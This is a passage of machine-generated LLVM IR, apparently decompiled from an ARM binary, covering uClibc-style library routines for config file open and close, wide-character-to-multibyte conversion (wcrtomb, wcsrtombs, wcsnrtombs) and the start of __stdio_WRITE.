  %v5_15a98 = call i32 @__GI_strchrnul(i32 %v0_15a90, i32 %v3_15a94, i32 %v1_15860, i32 %v1_1586c)
  store i32 %v5_15a98, i32* %r0.global-to-local, align 4
  store i32 %v1_1585c, i32* %r2.global-to-local, align 4
  store i1 %v2_15a10, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_15a98, i32* @r4, align 4
  br i1 %v2_15a10, label %dec_label_pc_15ac8, label %dec_label_pc_15ab4

dec_label_pc_15ab0:                               ; preds = %dec_label_pc_15ab4
  %v1_15ab0 = add i32 %v0_15ac8.pre, -1
  store i32 %v1_15ab0, i32* @r4, align 4
  br label %dec_label_pc_15ab4

dec_label_pc_15ab4:                               ; preds = %dec_label_pc_15a90, %dec_label_pc_15ab0
  %v0_15ab4 = phi i32 [ %v1_15ab0, %dec_label_pc_15ab0 ], [ %v5_15a98, %dec_label_pc_15a90 ]
  %v1_15ab4 = add i32 %v0_15ab4, -1
  %v2_15ab4 = inttoptr i32 %v1_15ab4 to i8*
  %v3_15ab4 = load i8, i8* %v2_15ab4, align 1
  %v4_15ab4 = zext i8 %v3_15ab4 to i32
  %v0_15ab8 = load i32, i32* @sl, align 4
  store i32 %v0_15ab8, i32* @r0, align 4
  %v2_15abc = call i32 @__GI_strchr(i32 %v0_15ab8, i32 %v4_15ab4)
  store i32 %v2_15abc, i32* %r0.global-to-local, align 4
  %v2_15ac0 = icmp eq i32 %v2_15abc, 0
  store i1 %v2_15ac0, i1* %cpsr_z.global-to-local, align 1
  %v0_15ac8.pre = load i32, i32* @r4, align 4
  br i1 %v2_15ac0, label %dec_label_pc_15ac8, label %dec_label_pc_15ab0

dec_label_pc_15ac8:                               ; preds = %dec_label_pc_15ab4, %dec_label_pc_15a90, %dec_label_pc_15a70
  %v3_15ad4 = phi i32 [ %v5_15a98, %dec_label_pc_15a90 ], [ %v2_15a88, %dec_label_pc_15a70 ], [ %v0_15ac8.pre, %dec_label_pc_15ab4 ]
  %v1_15ac8 = inttoptr i32 %v3_15ad4 to i8*
  %v2_15ac8 = load i8, i8* %v1_15ac8, align 1
  %v3_15ac8 = zext i8 %v2_15ac8 to i32
  store i32 %v3_15ac8, i32* %r2.global-to-local, align 4
  %v0_15acc = load i32, i32* @r7, align 4
  %v1_15acc = inttoptr i32 %v0_15acc to i8*
  %v2_15acc = load i8, i8* %v1_15acc, align 1
  %v3_15acc = zext i8 %v2_15acc to i32
  store i32 %v3_15acc, i32* %r3.global-to-local, align 4
  %v9_15ad0 = icmp eq i8 %v2_15acc, %v2_15ac8
  store i1 %v9_15ad0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15ad0, label %bb71, label %dec_label_pc_15adc

bb71:                                             ; preds = %dec_label_pc_15ac8
  %v1_15ad4 = load i32, i32* @fp, align 4
  %v2_15ad4 = trunc i32 %v1_15ad4 to i8
  store i8 %v2_15ad4, i8* %v1_15ac8, align 1
  %v0_15ad8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15ad8.pr, label %bb73, label %.dec_label_pc_15adc_crit_edge

.dec_label_pc_15adc_crit_edge:                    ; preds = %bb71
  %v0_15adc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15adc

dec_label_pc_15adc:                               ; preds = %.dec_label_pc_15adc_crit_edge, %dec_label_pc_15ac8
  %v0_15adc = phi i32 [ %v0_15adc.pre, %.dec_label_pc_15adc_crit_edge ], [ %v3_15ac8, %dec_label_pc_15ac8 ]
  %v2_15adc = icmp eq i32 %v0_15adc, 0
  store i1 %v2_15adc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15adc, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_15adc
  %v1_15ae0 = load i32, i32* @fp, align 4
  %v2_15ae0 = trunc i32 %v1_15ae0 to i8
  %v3_15ae0 = load i32, i32* @r4, align 4
  %v4_15ae0 = inttoptr i32 %v3_15ae0 to i8*
  store i8 %v2_15ae0, i8* %v4_15ae0, align 1
  %v5_15ae0 = load i32, i32* @r4, align 4
  %v6_15ae0 = add i32 %v5_15ae0, 1
  store i32 %v6_15ae0, i32* @r4, align 4
  br label %bb73

bb73:                                             ; preds = %bb71, %dec_label_pc_15adc, %bb72
  %v2_15ae4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_15ae4, i32* %r3.global-to-local, align 4
  %v2_15ae8 = icmp eq i32 %v2_15ae4, 0
  store i1 %v2_15ae8, i1* %cpsr_z.global-to-local, align 1
  %v0_15b04.pre = load i32, i32* @r4, align 4
  br i1 %v2_15ae8, label %dec_label_pc_15b00, label %dec_label_pc_15af0

dec_label_pc_15af0:                               ; preds = %bb73
  store i32 %v0_15b04.pre, i32* @r0, align 4
  %v1_15af8 = inttoptr i32 %v0_15b04.pre to i8*
  %v2_15af8 = call i32 @__GI_strspn(i8* %v1_15af8)
  store i32 %v2_15af8, i32* %r0.global-to-local, align 4
  %v0_15afc = load i32, i32* @r4, align 4
  %v2_15afc = add i32 %v0_15afc, %v2_15af8
  store i32 %v2_15afc, i32* @r4, align 4
  br label %dec_label_pc_15b00

dec_label_pc_15b00:                               ; preds = %bb73, %dec_label_pc_15af0
  %v0_15b04 = phi i32 [ %v2_15afc, %dec_label_pc_15af0 ], [ %v0_15b04.pre, %bb73 ]
  %v0_15b00 = load i32, i32* @r6, align 4
  %v1_15b00 = add i32 %v0_15b00, 1
  store i32 %v1_15b00, i32* @r6, align 4
  %v1_15b04 = inttoptr i32 %v0_15b04 to i8*
  %v2_15b04 = load i8, i8* %v1_15b04, align 1
  %v3_15b04 = zext i8 %v2_15b04 to i32
  store i32 %v3_15b04, i32* %r2.global-to-local, align 4
  %v2_15b08 = icmp eq i8 %v2_15b04, 0
  store i1 %v2_15b08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15b08, label %dec_label_pc_15b20, label %dec_label_pc_15b00.dec_label_pc_15b10_crit_edge

dec_label_pc_15b00.dec_label_pc_15b10_crit_edge:  ; preds = %dec_label_pc_15b00
  %v0_15b10.pre = load i32, i32* @r7, align 4
  %v1_15b10 = inttoptr i32 %v0_15b10.pre to i8*
  %v2_15b10 = load i8, i8* %v1_15b10, align 1
  %v3_15b10 = zext i8 %v2_15b10 to i32
  store i32 %v3_15b10, i32* %r3.global-to-local, align 4
  %v9_15b14 = icmp eq i8 %v2_15b10, %v2_15b04
  store i1 %v9_15b14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15b14, label %dec_label_pc_15b20, label %bb74

bb74:                                             ; preds = %dec_label_pc_15b10.preheader, %dec_label_pc_15b00.dec_label_pc_15b10_crit_edge
  %v2_15a5c88 = phi i32 [ %v1_15b00, %dec_label_pc_15b00.dec_label_pc_15b10_crit_edge ], [ %v1_15a40, %dec_label_pc_15b10.preheader ]
  %v0_15a5c87 = phi i32 [ %v0_15b04, %dec_label_pc_15b00.dec_label_pc_15b10_crit_edge ], [ %v0_15b0413, %dec_label_pc_15b10.preheader ]
  %v2_15b18 = load i32, i32* @sb, align 4
  %v3_15b18 = sub i32 %v2_15a5c88, %v2_15b18
  %v5_15b18 = xor i32 %v2_15b18, %v2_15a5c88
  %v6_15b18 = xor i32 %v3_15b18, %v2_15a5c88
  %v7_15b18 = and i32 %v6_15b18, %v5_15b18
  %v8_15b18 = icmp slt i32 %v7_15b18, 0
  %v9_15b18 = icmp slt i32 %v3_15b18, 0
  %v10_15b18 = icmp eq i32 %v2_15a5c88, %v2_15b18
  store i1 %v10_15b18, i1* %cpsr_z.global-to-local, align 1
  %v2_15b1c = xor i1 %v9_15b18, %v8_15b18
  br i1 %v2_15b1c, label %dec_label_pc_15a4c, label %dec_label_pc_15b20

dec_label_pc_15b20:                               ; preds = %dec_label_pc_15b10.preheader, %bb74, %dec_label_pc_15b00, %dec_label_pc_15b00.dec_label_pc_15b10_crit_edge, %dec_label_pc_15b04.preheader
  %v0_15b24 = phi i32 [ %v1_15a40, %dec_label_pc_15b04.preheader ], [ %v1_15a40, %dec_label_pc_15b10.preheader ], [ %v2_15a5c88, %bb74 ], [ %v1_15b00, %dec_label_pc_15b00 ], [ %v1_15b00, %dec_label_pc_15b00.dec_label_pc_15b10_crit_edge ]
  store i32 %v3_15844, i32* %r2.global-to-local, align 4
  %v9_15b24 = icmp eq i32 %v0_15b24, %v3_15844
  store i1 %v9_15b24, i1* %cpsr_z.global-to-local, align 1
  %v6_15b28 = icmp slt i32 %v0_15b24, %v3_15844
  br i1 %v6_15b28, label %dec_label_pc_15b2c, label %dec_label_pc_15b38

dec_label_pc_15b2c:                               ; preds = %dec_label_pc_15b20
  %v0_15b2c = load i32, i32* @r8, align 4
  %v1_15b2c = and i32 %v0_15b2c, 1048576
  %v2_15b2c = icmp eq i32 %v1_15b2c, 0
  store i1 %v2_15b2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15b2c, label %dec_label_pc_15884.backedge, label %dec_label_pc_15b34

dec_label_pc_15b34:                               ; preds = %dec_label_pc_15b2c, %dec_label_pc_159ec, %.thread, %entry
  br label %dec_label_pc_15b38

dec_label_pc_15b38:                               ; preds = %dec_label_pc_15b20, %dec_label_pc_15908, %dec_label_pc_15b34
  %v0_15b38 = phi i32 [ %v0_15918, %dec_label_pc_15908 ], [ 0, %dec_label_pc_15b34 ], [ %v0_15b24, %dec_label_pc_15b20 ]
  store i32 %v0_15b38, i32* %r0.global-to-local, align 4
  store i32 %v3_15820, i32* @r4, align 4
  store i32 %v6_15820, i32* @r5, align 4
  store i32 %v9_15820, i32* @r6, align 4
  store i32 %v12_15820, i32* @r7, align 4
  store i32 %v15_15820, i32* @r8, align 4
  store i32 %v18_15820, i32* @sb, align 4
  store i32 %v21_15820, i32* @sl, align 4
  store i32 %v24_15820, i32* @fp, align 4
  ret i32 %v0_15b38

; uselistorder directives
  uselistorder i32 %v0_15b38, { 1, 0 }
  uselistorder i32 %v0_15b24, { 0, 2, 1 }
  uselistorder i32 %v3_15b18, { 1, 0 }
  uselistorder i32 %v2_15b18, { 1, 0, 2 }
  uselistorder i32 %v2_15a5c88, { 0, 1, 6, 5, 2, 3, 4 }
  uselistorder i1 %v9_15b14, { 1, 0 }
  uselistorder i32 %v0_15b04.pre, { 0, 2, 1 }
  uselistorder i32 %v5_15a98, { 1, 0, 2, 3 }
  uselistorder i1 %v9_15b1486, { 1, 0 }
  uselistorder i1 %v9_15a3c, { 1, 0 }
  uselistorder i32 %v3_15a14, { 0, 2, 1, 3 }
  uselistorder i1 %v7_159ec, { 1, 0 }
  uselistorder i1 %v8_159e4, { 1, 0 }
  uselistorder i32 %v3_159b4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_159a4, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v3_1598c, { 1, 0, 2 }
  uselistorder i32 %v1_1597c, { 1, 0, 2 }
  uselistorder i32 %v0_15968, { 0, 2, 1, 3 }
  uselistorder i32 %v1_15960, { 1, 0 }
  uselistorder i32 %v1_1594c, { 1, 0 }
  uselistorder i32 %v1_15948, { 1, 0 }
  uselistorder i32 %v2_15924, { 1, 0 }
  uselistorder i32 %v1_15908, { 2, 0, 1 }
  uselistorder i32 %v0_158f0, { 1, 0 }
  uselistorder i32 %v1_158e0, { 0, 2, 1 }
  uselistorder i1 %v2_15a10, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1586c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_15860, { 2, 1, 0 }
  uselistorder i32 %v3_15848, { 1, 0 }
  uselistorder i32 %v3_15844, { 2, 1, 0 }
  uselistorder i32 %v1_1583c, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 25, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 8, 3, 4, 5, 6, 7, 1, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 28, 26, 27, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 12, 13, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 33, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 %arg3, { 2, 3, 1, 5, 0, 4, 6 }
  uselistorder label %dec_label_pc_15b38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15b20, { 1, 3, 2, 0, 4 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_15b00, { 1, 0 }
  uselistorder label %bb73, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15ab4, { 1, 0 }
  uselistorder label %dec_label_pc_15884.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15a2c, { 1, 0 }
  uselistorder label %dec_label_pc_159ec, { 1, 0 }
  uselistorder label %dec_label_pc_159e0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_159a4, { 1, 0 }
  uselistorder label %dec_label_pc_158d8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_15b4c = icmp eq i32* %arg1, null
  br i1 %v2_15b4c, label %dec_label_pc_15b74, label %dec_label_pc_15b54

dec_label_pc_15b54:                               ; preds = %entry
  %v2_15b54 = load i32, i32* %arg1, align 4
  %v1_15b58 = inttoptr i32 %v2_15b54 to i16*
  %v2_15b58 = call i32 @__GI_fclose(i16* %v1_15b58)
  %v0_15b5c = load i32, i32* @r4, align 4
  %v1_15b5c = add i32 %v0_15b5c, 20
  %v2_15b5c = inttoptr i32 %v1_15b5c to i32*
  %v3_15b5c = load i32, i32* %v2_15b5c, align 4
  %v2_15b60 = icmp eq i32 %v3_15b5c, 0
  br i1 %v2_15b60, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_15b54
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_15b54, %bb
  store i32 88940, i32* @lr, align 4
  %v1_15b68 = xor i1 %v2_15b60, true
  call void @__pseudo_cond_branch(i1 %v1_15b68, i32 ptrtoint (i32* @global_var_136fc.598 to i32))
  %v0_15b6c = load i32, i32* @r4, align 4
  store i32 %v0_15b6c, i32* @r0, align 4
  %v0_15b70 = call i32 @free()
  br label %dec_label_pc_15b74

dec_label_pc_15b74:                               ; preds = %entry, %bb6
  %v1_15b78 = phi i32 [ 0, %entry ], [ %v0_15b70, %bb6 ]
  ret i32 %v1_15b78

; uselistorder directives
  uselistorder label %dec_label_pc_15b74, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15b88 = load i32, i32* @r4, align 4
  store i32 %v3_15b88, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33888), i32* @r1, align 4
  %v0_15b90 = load i32, i32* @r0, align 4
  %v2_15b90 = call i32 @__GI_fopen(i32 %v0_15b90, i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33888))
  store i32 %v2_15b90, i32* %r0.global-to-local, align 4
  store i32 %v2_15b90, i32* @r4, align 4
  %v2_15b94 = icmp eq i32 %v2_15b90, 0
  br i1 %v2_15b94, label %bb, label %dec_label_pc_15ba0

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_15ba0:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_15ba8 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_15ba8, i32* %r0.global-to-local, align 4
  %v2_15bac = icmp eq i32 %v2_15ba8, 0
  br i1 %v2_15bac, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_15ba0
  %v1_15bb0 = load i32, i32* @r4, align 4
  %v3_15bb0 = inttoptr i32 %v2_15ba8 to i32*
  store i32 %v1_15bb0, i32* %v3_15bb0, align 4
  %v1_15bb8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_15ba0, %bb4
  %v1_15bb8 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_15ba0 ], [ %v1_15bb8.pre, %bb4 ]
  %v2_15bb4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15bb4, i32* @r4, align 4
  ret i32 %v1_15bb8

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33888), { 1, 0 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_15bc4 = load i32, i32* @lr, align 4
  %v2_15bc8 = icmp eq i32 %arg1, 0
  br i1 %v2_15bc8, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_15bd0 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_15bf8 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_15be4 = phi i32 [ %arg1, %.thread ], [ %v3_15bd0, %bb ]
  store i32 %arg3, i32* @r4, align 4
  %v2_15be0 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_15be0, i32* @ip, align 4
  %v2_15be8 = ptrtoint i32* %stack_var_-16 to i32
  store i32 16, i32* @r3, align 4
  store i32 %v2_15be0, i32* %stack_var_-16, align 4
  store i32 %v0_15bf8, i32* %stack_var_-12, align 4
  %v5_15c00 = inttoptr i32 %v0_15be4 to i8*
  %v6_15c00 = call i32 @__GI_wcsnrtombs(i8* %v5_15c00, i32 %v2_15be8, i32 1, i32 16, i32 %arg3)
  %v2_15c04 = icmp eq i32 %v6_15c00, 0
  br i1 %v2_15c04, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v1_15c14 = phi i32 [ %v6_15c00, %bb11 ], [ 1, %bb12 ]
  store i32 %v6_15bc4, i32* @lr, align 4
  ret i32 %v1_15c14

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_15c2c = load i32, i32* @r0, align 4
  %v1_15c2c = load i32, i32* @r1, align 4
  %v5_15c2c = inttoptr i32 %v0_15c2c to i8*
  %v6_15c2c = call i32 @__GI_wcsnrtombs(i8* %v5_15c2c, i32 %v1_15c2c, i32 -1, i32 %arg1, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_15c2c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15c3c = load i32, i32* @r4, align 4
  store i32 %v3_15c3c, i32* %stack_var_-12, align 4
  %v10_15c40 = icmp eq i32 %tmp, %arg2
  store i1 %v10_15c40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v10_15c40, label %dec_label_pc_15c58, label %bb

bb:                                               ; preds = %entry
  %v4_15c44 = icmp eq i8* %arg1, null
  store i1 %v4_15c44, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %lr.global-to-local, align 4
  br i1 %v4_15c44, label %dec_label_pc_15c58.thread, label %bb39

dec_label_pc_15c58.thread:                        ; preds = %bb
  %v2_15c48 = ptrtoint i32* %stack_var_-32 to i32
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb40

bb39:                                             ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

dec_label_pc_15c58:                               ; preds = %entry
  %v2_15c481 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v3_15c58 = icmp eq i8* %arg1, null
  store i1 %v3_15c58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15c58, label %bb40, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_15c58
  store i32 %v2_15c481, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

bb40:                                             ; preds = %dec_label_pc_15c58, %dec_label_pc_15c58.thread
  %storemerge20 = phi i32 [ %v2_15c481, %dec_label_pc_15c58 ], [ %v2_15c48, %dec_label_pc_15c58.thread ]
  store i32 %storemerge20, i32* %lr.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %.thread14.thread

.thread14.thread:                                 ; preds = %bb39, %.thread8, %bb40
  %v2_15cb428 = phi i32 [ %v2_15c481, %.thread8 ], [ %tmp, %bb39 ], [ %storemerge20, %bb40 ]
  %v0_15c70 = load i32, i32* @r3, align 4
  %v3_15c70 = icmp uge i32 %v0_15c70, %arg3
  %arg3.v0_15c70 = select i1 %v3_15c70, i32 %arg3, i32 %v0_15c70
  store i32 %arg3.v0_15c70, i32* %r5.global-to-local, align 4
  %v1_15c7c = inttoptr i32 %arg2 to i32*
  %v2_15c7c = load i32, i32* %v1_15c7c, align 4
  store i32 %v2_15c7c, i32* %r2.global-to-local, align 4
  store i32 %arg3.v0_15c70, i32* %r0.global-to-local, align 4
  %v2_15cc822 = icmp eq i32 %arg3.v0_15c70, 0
  store i1 %v2_15cc822, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15cc822, label %dec_label_pc_15cd0, label %dec_label_pc_15c88

dec_label_pc_15c88:                               ; preds = %.thread14.thread, %dec_label_pc_15cc0.dec_label_pc_15c88_crit_edge
  %v2_15cb4 = phi i32 [ %v2_15cc0, %dec_label_pc_15cc0.dec_label_pc_15c88_crit_edge ], [ %v2_15cb428, %.thread14.thread ]
  %v0_15c94 = phi i32 [ %v0_15c88.pre, %dec_label_pc_15cc0.dec_label_pc_15c88_crit_edge ], [ %v2_15c7c, %.thread14.thread ]
  %v1_15c88 = inttoptr i32 %v0_15c94 to i32*
  %v2_15c88 = load i32, i32* %v1_15c88, align 4
  %v7_15c8c = icmp eq i32 %v2_15c88, 127
  store i1 %v7_15c8c, i1* %cpsr_z.global-to-local, align 1
  %v1_15c90 = urem i32 %v2_15c88, 256
  store i32 %v1_15c90, i32* @ip, align 4
  %v1_15c94 = add i32 %v0_15c94, 4
  store i32 %v1_15c94, i32* %r2.global-to-local, align 4
  %tmp45 = icmp ult i32 %v2_15c88, 128
  br i1 %tmp45, label %dec_label_pc_15cb0, label %dec_label_pc_15c9c

dec_label_pc_15c9c:                               ; preds = %dec_label_pc_15c88
  %v0_15c9c = call i32 @__GI___errno_location()
  store i32 %v0_15c9c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_15ca8 = inttoptr i32 %v0_15c9c to i32*
  store i32 84, i32* %v2_15ca8, align 4
  %v0_15cdc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15cdc

dec_label_pc_15cb0:                               ; preds = %dec_label_pc_15c88
  %v2_15cb0 = icmp eq i32 %v1_15c90, 0
  store i1 %v2_15cb0, i1* %cpsr_z.global-to-local, align 1
  %v1_15cb4 = trunc i32 %v2_15c88 to i8
  %v3_15cb4 = inttoptr i32 %v2_15cb4 to i8*
  store i8 %v1_15cb4, i8* %v3_15cb4, align 1
  %v0_15cb8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15cb8, label %.dec_label_pc_15cd0_crit_edge, label %dec_label_pc_15cc0

dec_label_pc_15cc0:                               ; preds = %dec_label_pc_15cb0
  %v0_15cc0 = load i32, i32* %lr.global-to-local, align 4
  %v1_15cc0 = load i32, i32* %r4.global-to-local, align 4
  %v2_15cc0 = add i32 %v1_15cc0, %v0_15cc0
  store i32 %v2_15cc0, i32* %lr.global-to-local, align 4
  %v0_15cc4 = load i32, i32* %r0.global-to-local, align 4
  %v1_15cc4 = add i32 %v0_15cc4, -1
  store i32 %v1_15cc4, i32* %r0.global-to-local, align 4
  %v2_15cc8 = icmp eq i32 %v1_15cc4, 0
  store i1 %v2_15cc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15cc8, label %dec_label_pc_15cd0, label %dec_label_pc_15cc0.dec_label_pc_15c88_crit_edge

dec_label_pc_15cc0.dec_label_pc_15c88_crit_edge:  ; preds = %dec_label_pc_15cc0
  %v0_15c88.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15c88

.dec_label_pc_15cd0_crit_edge:                    ; preds = %dec_label_pc_15cb0
  %v1_15cb8 = load i32, i32* @ip, align 4
  store i32 %v1_15cb8, i32* %r2.global-to-local, align 4
  %v0_15cd0.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_15cd0

dec_label_pc_15cd0:                               ; preds = %dec_label_pc_15cc0, %.dec_label_pc_15cd0_crit_edge, %.thread14.thread
  %v0_15cd0 = phi i32 [ %v0_15cd0.pre, %.dec_label_pc_15cd0_crit_edge ], [ %v2_15cb428, %.thread14.thread ], [ %v2_15cc0, %dec_label_pc_15cc0 ]
  %v1_15cd0 = load i32, i32* @sp, align 4
  %v9_15cd0 = icmp eq i32 %v0_15cd0, %v1_15cd0
  store i1 %v9_15cd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15cd0, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_15cd0
  %v1_15cd4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_15cd4, i32* %v1_15c7c, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_15cd0, %bb43
  %v0_15cd8 = load i32, i32* %r0.global-to-local, align 4
  %v1_15cd8 = load i32, i32* %r5.global-to-local, align 4
  %v2_15cd8 = sub i32 %v1_15cd8, %v0_15cd8
  store i32 %v2_15cd8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15cdc

dec_label_pc_15cdc:                               ; preds = %dec_label_pc_15c9c, %bb44
  %v0_15cdc = phi i32 [ %v0_15cdc.pre, %dec_label_pc_15c9c ], [ %v2_15cd8, %bb44 ]
  store i32 %v0_15cdc, i32* %r0.global-to-local, align 4
  %v2_15ce4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15ce4, i32* %r4.global-to-local, align 4
  ret i32 %v0_15cdc

; uselistorder directives
  uselistorder i32 %v0_15cdc, { 1, 0 }
  uselistorder i32 %v1_15cc4, { 1, 0 }
  uselistorder i32 %v2_15cc0, { 0, 2, 1 }
  uselistorder i32 %v1_15c90, { 1, 0 }
  uselistorder i32 %v2_15c88, { 2, 0, 1, 3 }
  uselistorder i32 %v2_15cb428, { 1, 0 }
  uselistorder i32 %v2_15c481, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 5, 3, 4, 6, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 0 }
  uselistorder i32* %lr.global-to-local, { 5, 1, 4, 6, 2, 0, 3 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 5, 2, 3, 4, 9, 6, 0, 7, 8 }
  uselistorder i32 127, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15cdc, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_15cd0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15c88, { 1, 0 }
  uselistorder label %.thread14.thread, { 2, 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_15cec = load i32, i32* @r4, align 4
  store i32 %v3_15cec, i32* %stack_var_-24, align 4
  store i32 %arg3, i32* @r7, align 4
